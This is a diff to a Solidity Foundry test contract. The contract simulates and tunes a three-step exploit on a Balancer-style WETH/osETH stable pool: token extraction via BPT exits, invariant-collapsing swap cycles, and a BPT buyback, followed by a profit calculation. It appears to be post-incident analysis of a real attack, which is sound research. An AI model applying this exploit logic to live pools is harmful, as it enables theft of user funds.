@@ -405,7 +405,8 @@ contract SearchParams is Test {
         uint256 balWETH,
         uint256 balOSETH,
         uint256 bptToBuy,
-        uint256 virtualSupply
+        uint256 virtualSupply,
+        uint256 initialStoredInvariant
     ) internal view returns (uint256 totalCost) {
         (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);
 
@@ -413,9 +414,8 @@ contract SearchParams is Test {
         uint256 bO = balOSETH;
         uint256 supply = virtualSupply;
         // Track stored invariant for between-swap protocol fees.
-        // Initialize to fresh invariant so the first check yields no fee
-        // (real contract's stored invariant from Step 1 is higher than post-cycling fresh).
-        uint256 storedInvariant = _getInvariant(bW, bO);
+        // Use the post-Phase2 stored invariant (threaded from cycling's last swap).
+        uint256 storedInvariant = initialStoredInvariant;
         for (uint256 i = 0; i < swapCount; i++) {
             uint256 preInvariant = _getInvariant(bW, bO);
 
@@ -459,7 +459,8 @@ contract SearchParams is Test {
         uint256 balWETH,
         uint256 balOSETH,
         uint256 bptToBuy,
-        uint256 virtualSupply
+        uint256 virtualSupply,
+        uint256 initialStoredInvariant
     ) internal returns (uint256 totalCost) {
         (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);
 
@@ -474,7 +475,7 @@ contract SearchParams is Test {
         }
         console.log("Step3 totalBpt:", totalBpt);
 
-        uint256 storedInvariant = _getInvariant(bW, bO);
+        uint256 storedInvariant = initialStoredInvariant;
         for (uint256 i = 0; i < swapCount; i++) {
             uint256 preInvariant = _getInvariant(bW, bO);
 
@@ -573,7 +574,7 @@ contract SearchParams is Test {
         uint256 realOSETH,
         uint256 targetRemain,
         uint256 bptSupply
-    ) internal view returns (uint256 totalBptSold, uint256 totalTokensOut, uint256 remainingSupply) {
+    ) internal view returns (uint256 totalBptSold, uint256 totalTokensOut, uint256 remainingSupply, uint256 lastPostJoinExitInvariant) {
         // Generate token extraction schedules (same pattern as real attack)
         (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(realWETH, targetRemain, 15);
         (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(realOSETH, targetRemain, 15);
@@ -613,6 +614,8 @@ contract SearchParams is Test {
 
                 // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
                 supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
+                // Track the stored invariant (mirrors _updatePostJoinExit)
+                lastPostJoinExitInvariant = postInv;
             }
             // osETH exit: BPT → osETH (GIVEN_OUT)
             if (i < osethCount) {
@@ -636,6 +639,8 @@ contract SearchParams is Test {
 
                 // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
                 supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
+                // Track the stored invariant (mirrors _updatePostJoinExit)
+                lastPostJoinExitInvariant = postInv;
             }
         }
         remainingSupply = supply;
@@ -744,6 +749,8 @@ contract SearchParams is Test {
 
     /// @notice Helper: compute profit for a given remain value using high-fidelity simulation.
     /// Chains virtualSupply from Step 1 → Step 3 for accurate pricing.
+    /// Phase 2 (token↔token swaps) does NOT update _lastPostJoinExitInvariant in the real contract,
+    /// so Phase 3 sees the invariant stored after Phase 1's last exit.
     function _computeProfit(
         uint256 remain,
         uint256 wAfter,
@@ -752,7 +759,7 @@ contract SearchParams is Test {
         uint256 realOSETH,
         uint256 totalBPT
     ) internal view returns (uint256) {
-        (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply) =
+        (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply, uint256 phase1Invariant) =
             _simulateStep1Extraction(realWETH, realOSETH, remain, totalBPT);
         uint256 sumAfter = wAfter + oAfter;
         // The pool loses (2*remain - sumAfter) tokens during cycling, which flow to the attacker.
@@ -761,7 +768,8 @@ contract SearchParams is Test {
         // Step 2 (cycling) doesn't involve BPT, so virtualSupply stays at postStep1Supply
         // Use the real attack's bptTarget = actualSupply * 10030 / 10000 (not bptSold)
         uint256 bptTarget = totalBPT * 10030 / 10000;
-        uint256 repaymentCost = _simulateStep3Repayment(wAfter, oAfter, bptTarget, postStep1Supply);
+        // Phase 2 token↔token swaps don't update storedInvariant, so Phase 3 uses Phase 1's last postInv
+        uint256 repaymentCost = _simulateStep3Repayment(wAfter, oAfter, bptTarget, postStep1Supply, phase1Invariant);
         if (tokensExtracted + cyclingGain < repaymentCost) return 0; // net loss
         return tokensExtracted + cyclingGain - repaymentCost;
     }
@@ -1005,14 +1013,16 @@ contract SearchParams is Test {
         uint256 N = 30;
 
         // Step 1: simulate sequential GIVEN_OUT BPT→token exits with geometric decay
-        (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply) =
+        (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply, uint256 phase1Inv) =
             _simulateStep1Extraction(realWETH, realOSETH, remain, totalBPT);
         console.log("--- Step 1 (simulated) ---");
         console.log("Tokens extracted:", tokensExtracted);
         console.log("BPT sold:", bptSold);
         console.log("Post-Step1 virtualSupply:", postStep1Supply);
+        console.log("Phase1 lastPostJoinExitInvariant:", phase1Inv);
 
         // Step 2: cycle N rounds, track exact balances
+        // Token↔token swaps do NOT update _lastPostJoinExitInvariant in the real contract
         uint256 balWETH = remain;
         uint256 balOSETH = remain;
         uint256 dBefore = _getInvariant(balWETH, balOSETH);
@@ -1031,13 +1041,11 @@ contract SearchParams is Test {
         console.log("Cycling gain (tokens extracted from pool by D-crash):", cyclingGain);
 
         // Step 3: simulate buying back BPT with dynamic D recovery
-        // The attacker targets 100.3% of getActualSupply() to ensure full liquidation
-        // and cover rounding: slot[0x33] = 10030 => bptTarget = totalBPT * 10030 / 10000
+        // Phase 3 reads _lastPostJoinExitInvariant from Phase 1 (Phase 2 didn't update it)
         uint256 bptTarget = totalBPT * 10030 / 10000;
-        // virtualSupply doesn't change during Step 2 (no BPT swaps), so use postStep1Supply
         console.log("--- Step 3 ---");
         console.log("bptTarget:", bptTarget);
-        uint256 repaymentCost = _simulateStep3RepaymentDebug(balWETH, balOSETH, bptTarget, postStep1Supply);
+        uint256 repaymentCost = _simulateStep3RepaymentDebug(balWETH, balOSETH, bptTarget, postStep1Supply, phase1Inv);
         console.log("Repayment cost (tokens to buy back BPT):", repaymentCost);
 
         // Net profit = tokens left over
@@ -1261,43 +1269,50 @@ contract SearchParams is Test {
 
         uint256[2] memory remains = [uint256(67000), uint256(94000)];
         for (uint256 idx = 0; idx < 2; idx++) {
-            uint256 remain = remains[idx];
-            console.log("========== remain =", remain, "==========");
-
-            // Step 1
-            (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply) =
-                _simulateStep1Extraction(realWETH, realOSETH, remain, totalBPT);
-            console.log("Step1 tokensExtracted:", tokensExtracted);
-            console.log("Step1 bptSold:", bptSold);
-            console.log("Step1 postSupply:", postStep1Supply);
-
-            // Step 2
-            uint256 bW = remain; uint256 bO = remain;
-            uint256 dBefore = _getInvariant(bW, bO);
-            for (uint256 r = 0; r < N; r++) {
-                (bW, bO) = this.simulateOneRound(bW, bO, trickAmt);
-            }
-            uint256 dAfter = _getInvariant(bW, bO);
-            console.log("Step2 D_before:", dBefore, "D_after:", dAfter);
-            console.log("Step2 balW:", bW, "balO:", bO);
-            console.log("Step2 D_deflation_bps:", (dBefore - dAfter) * 10000 / dBefore);
-            uint256 cyclingGain = 2 * remain - (bW + bO);
-            console.log("Step2 cyclingGain:", cyclingGain);
-
-            // Step 3
-            uint256 bptTarget = totalBPT * 10030 / 10000;
-            console.log("Step3 bptTarget:", bptTarget);
-            console.log("Step3 postStep1Supply:", postStep1Supply);
-            uint256 repaymentCost = _simulateStep3RepaymentDebug(bW, bO, bptTarget, postStep1Supply);
-            console.log("Step3 repaymentCost:", repaymentCost);
-
-            // Profit
-            uint256 profit = tokensExtracted + cyclingGain - repaymentCost;
-            console.log("NET PROFIT (wei):", profit);
-            console.log("NET PROFIT (ETH):", profit / 1e18);
-            console.log("");
+            _compareRemainsOnePass(remains[idx], trickAmt, N, realWETH, realOSETH, totalBPT);
         }
     }
+
+    function _compareRemainsOnePass(
+        uint256 remain, uint256 trickAmt, uint256 N,
+        uint256 realWETH, uint256 realOSETH, uint256 totalBPT
+    ) internal {
+        console.log("========== remain =", remain, "==========");
+
+        // Step 1
+        (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply, uint256 phase1Inv) =
+            _simulateStep1Extraction(realWETH, realOSETH, remain, totalBPT);
+        console.log("Step1 tokensExtracted:", tokensExtracted);
+        console.log("Step1 bptSold:", bptSold);
+        console.log("Step1 postSupply:", postStep1Supply);
+
+        // Step 2 — token↔token swaps don't update _lastPostJoinExitInvariant
+        uint256 bW = remain; uint256 bO = remain;
+        uint256 dBefore = _getInvariant(bW, bO);
+        for (uint256 r = 0; r < N; r++) {
+            (bW, bO) = this.simulateOneRound(bW, bO, trickAmt);
+        }
+        uint256 dAfter = _getInvariant(bW, bO);
+        console.log("Step2 D_before:", dBefore, "D_after:", dAfter);
+        console.log("Step2 balW:", bW, "balO:", bO);
+        console.log("Step2 D_deflation_bps:", (dBefore - dAfter) * 10000 / dBefore);
+        uint256 cyclingGain = 2 * remain - (bW + bO);
+        console.log("Step2 cyclingGain:", cyclingGain);
+
+        // Step 3 — uses Phase 1's lastPostJoinExitInvariant
+        uint256 bptTarget = totalBPT * 10030 / 10000;
+        console.log("Step3 bptTarget:", bptTarget);
+        console.log("Step3 postStep1Supply:", postStep1Supply);
+        uint256 repaymentCost = _simulateStep3RepaymentDebug(bW, bO, bptTarget, postStep1Supply, phase1Inv);
+        console.log("Step3 repaymentCost:", repaymentCost);
+
+        // Profit
+        uint256 profit = tokensExtracted + cyclingGain - repaymentCost;
+        console.log("NET PROFIT (wei):", profit);
+        console.log("NET PROFIT (ETH):", profit / 1e18);
+        console.log("");
+    }
+
 
     /// @notice Lightweight landscape scan: which remain values are attractors?
     /// Simulates coarse search strategies an attacker might use.
@@ -1433,13 +1448,13 @@ contract SearchParams is Test {
         uint256 tokenIndex,
         uint256 tokenOut,
         uint256 preInvariant
-    ) internal view returns (uint256 newBal, uint256 newSupply, uint256 bptIn) {
+    ) internal view returns (uint256 newBal, uint256 newSupply, uint256 bptIn, uint256 postInv) {
         uint256[] memory bal = new uint256[](2);
         uint256[] memory scalingFactors = new uint256[](2);
         bal[0] = bW; bal[1] = bO;
         scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
         bptIn = swapMath.getBptInForTokenOut(bal, scalingFactors, tokenIndex, tokenOut, supply, amp, swapFeePercentage);
-        uint256 postInv = _calcPostInvariant(bW, bO, tokenIndex, tokenOut, false);
+        postInv = _calcPostInvariant(bW, bO, tokenIndex, tokenOut, false);
         uint256 postBW = tokenIndex == 0 ? bW - tokenOut : bW;
         uint256 postBO = tokenIndex == 1 ? bO - tokenOut : bO;
         uint256 postSupply = supply - bptIn;
@@ -1453,7 +1468,7 @@ contract SearchParams is Test {
         uint256 realOSETH,
         uint256 targetRemain,
         uint256 bptSupply
-    ) internal view returns (uint256 totalWethOut, uint256 totalOsethOut, uint256 totalBptSold, uint256 remainingSupply) {
+    ) internal returns (uint256 totalWethOut, uint256 totalOsethOut, uint256 totalBptSold, uint256 remainingSupply, uint256 lastPostJoinExitInvariant) {
         (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(realWETH, targetRemain, 15);
         (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(realOSETH, targetRemain, 15);
 
@@ -1468,17 +1483,21 @@ contract SearchParams is Test {
             if (i < wethCount) {
                 uint256 preInv = _getInvariant(bW, bO);
                 uint256 bptIn;
-                (bW, supply, bptIn) = _doSingleExitStep(bW, bO, supply, 0, wethAmounts[i], preInv);
+                uint256 postInv;
+                (bW, supply, bptIn, postInv) = _doSingleExitStep(bW, bO, supply, 0, wethAmounts[i], preInv);
                 totalBptSold += bptIn;
                 totalWethOut += wethAmounts[i];
+                lastPostJoinExitInvariant = postInv;
                 console.log("[SP1] step", i, "WETH supply_after:", supply);
             }
             if (i < osethCount) {
                 uint256 preInv = _getInvariant(bW, bO);
                 uint256 bptIn;
-                (bO, supply, bptIn) = _doSingleExitStep(bW, bO, supply, 1, osethAmounts[i], preInv);
+                uint256 postInv;
+                (bO, supply, bptIn, postInv) = _doSingleExitStep(bW, bO, supply, 1, osethAmounts[i], preInv);
                 totalBptSold += bptIn;
                 totalOsethOut += osethAmounts[i];
+                lastPostJoinExitInvariant = postInv;
                 console.log("[SP1] step", i, "OSETH supply_after:", supply);
             }
         }
@@ -1490,7 +1509,8 @@ contract SearchParams is Test {
         uint256 balWETH,
         uint256 balOSETH,
         uint256 bptToBuy,
-        uint256 virtualSupply
+        uint256 virtualSupply,
+        uint256 initialStoredInvariant
     ) internal returns (uint256 wethCost, uint256 osethCost, uint256 totalBptBought) {
         (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);
 
@@ -1499,7 +1519,7 @@ contract SearchParams is Test {
         uint256 supply = virtualSupply;
 
         console.log("[SP] Phase3 step count:", swapCount);
-        uint256 storedInvariant = _getInvariant(bW, bO);
+        uint256 storedInvariant = initialStoredInvariant;
         for (uint256 i = 0; i < swapCount; i++) {
             totalBptBought += bptAmounts[i];
             uint256 preInvariant = _getInvariant(bW, bO);
@@ -1536,7 +1556,8 @@ contract SearchParams is Test {
         uint256 balWETH,
         uint256 balOSETH,
         uint256 bptToBuy,
-        uint256 virtualSupply
+        uint256 virtualSupply,
+        uint256 initialStoredInvariant
     ) internal view returns (uint256 wethCost, uint256 osethCost, uint256 totalBptBought) {
         (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);
 
@@ -1544,7 +1565,7 @@ contract SearchParams is Test {
         uint256 bO = balOSETH;
         uint256 supply = virtualSupply;
 
-        uint256 storedInvariant = _getInvariant(bW, bO);
+        uint256 storedInvariant = initialStoredInvariant;
         for (uint256 i = 0; i < swapCount; i++) {
             totalBptBought += bptAmounts[i];
             uint256 preInvariant = _getInvariant(bW, bO);
@@ -1608,27 +1629,27 @@ contract SearchParams is Test {
         //   bptSold = (actualSupply - finalSupply) + totalFeeBpt
         //   1. actualSupply - finalSupply: BPT shares genuinely redeemed from the pool
         //   2. totalFeeBpt: extra BPT cost caused by protocol fee minting inflating virtualSupply
-        (uint256 wethOut, uint256 osethOut, uint256 bptSold, uint256 postStep1Supply) =
+        (uint256 wethOut, uint256 osethOut, uint256 bptSold, uint256 postStep1Supply, uint256 phase1Invariant) =
             _simulateStep1ExtractionDetailed(realWETH, realOSETH, remain, totalBPT);
         console.log("--- Step 1: Token Extraction ---");
         console.log("WETH extracted:", wethOut);
         console.log("osETH extracted:", osethOut);
         console.log("BPT sold:", bptSold);
+        console.log("[SP] phase1 lastPostJoinExitInvariant:", phase1Invariant);
 
-        // Step 2: D-collapse cycling (per-token costs) — thread invariant
+        // Step 2: D-collapse cycling (per-token costs)
+        // Token↔token swaps do NOT update _lastPostJoinExitInvariant in the real contract
         uint256 bW = remain; uint256 bO = remain;
-        uint256 phase2Invariant; // will hold the stored invariant after Phase 2's last swap
         console.log("--- Step 2: D-Collapse Cycling ---");
         console.log("[SP] trickAmt:", trickAmt);
         console.log("[SP] sf[0]:", sf[0]);
         console.log("[SP] sf[1]:", sf[1]);
         for (uint256 r = 0; r < N; r++) {
-            (bW, bO, phase2Invariant) = this.simulateOneRoundWithInvariant(bW, bO, trickAmt);
+            (bW, bO) = this.simulateOneRound(bW, bO, trickAmt);
             console.log("[SP] Round:", r);
             console.log("[SP]   bW:", bW);
             console.log("[SP]   bO:", bO);
         }
-        console.log("[SP] phase2Invariant (stored after last round):", phase2Invariant);
         // Pool WETH dropped from remain→bW; that difference flowed to attacker (GAIN, not cost)
         uint256 wethGainStep2 = remain - bW;
         uint256 osethGainStep2 = remain - bO;
@@ -1648,7 +1669,7 @@ contract SearchParams is Test {
         // uint256 bptTarget = 11838483978630598473877;
         uint256 bptTarget = totalBPT * 10030 / 10000;
         (uint256 wethCostStep3, uint256 osethCostStep3, uint256 bptBought) =
-            _simulateStep3RepaymentDetailedWithLog(bW, bO, bptTarget, postStep1Supply);
+            _simulateStep3RepaymentDetailedWithLog(bW, bO, bptTarget, postStep1Supply, phase1Invariant);
         console.log("--- Step 3: BPT Buyback ---");
         console.log("[SP] Phase3 WETH cost:", wethCostStep3);
         console.log("[SP] Phase3 osETH cost:", osethCostStep3);
@@ -1913,7 +1934,7 @@ contract SearchParams is Test {
         console.log("Minimum Phase 3 BPT buyback:", minBuyback);
 
         // Compare with simulation
-        (,, uint256 bptSold,) = _simulateStep1ExtractionDetailed(balances[0], balances[2], remain, totalBPT);
+        (,, uint256 bptSold,,) = _simulateStep1ExtractionDetailed(balances[0], balances[2], remain, totalBPT);
         console.log("Simulation BPT sold (Phase 1):", bptSold);
 
         // Compare with attacker's bptTarget formula
